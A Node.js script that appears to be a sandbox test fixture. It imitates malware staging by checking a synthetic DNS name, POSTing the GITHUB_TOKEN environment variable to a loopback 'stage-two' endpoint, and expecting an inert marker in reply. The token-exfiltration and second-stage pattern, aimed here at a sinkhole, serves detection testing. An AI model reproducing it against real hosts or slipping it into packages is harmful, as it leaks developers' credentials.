'use strict';

const dns = require('node:dns').promises;
const fs = require('node:fs');
const http = require('node:http');

async function resolveSyntheticDNS() {
  const addresses = await dns.resolve4('behavior.invalid');
  if (addresses.length !== 1 || addresses[0] !== '127.0.0.1') throw new Error('synthetic DNS returned a non-loopback address');
}

function fetchSyntheticStage() {
  return new Promise((resolve, reject) => {
    const canary = process.env.GITHUB_TOKEN || 'missing';
    const request = http.request({
      host: '127.0.0.1',
      port: 80,
      path: '/stage-two',
      method: 'POST',
      headers: { 'content-type': 'application/octet-stream', 'content-length': String(Buffer.byteLength(canary)) },
      timeout: 2_000,
    }, (response) => {
      let body = '';
      response.setEncoding('utf8');
      response.on('data', (chunk) => {
        if (body.length < 4096) body += chunk;
      });
      response.on('end', () => {
        if (!body.includes('behaviorlock-inert-synthetic-v1')) reject(new Error('unexpected synthetic stage'));
        else resolve();
      });
    });
    request.once('timeout', () => request.destroy(new Error('synthetic HTTP timeout')));
    request.once('error', reject);
    request.end(canary);
  });
}

(async () => {
  await resolveSyntheticDNS();
  await fetchSyntheticStage();
  fs.writeFileSync('/work/behaviorlock-sinkhole-stage', 'inert stage reached\n');
})().catch((error) => {
  process.stderr.write(`${error.message}\n`);
  process.exit(73);
});
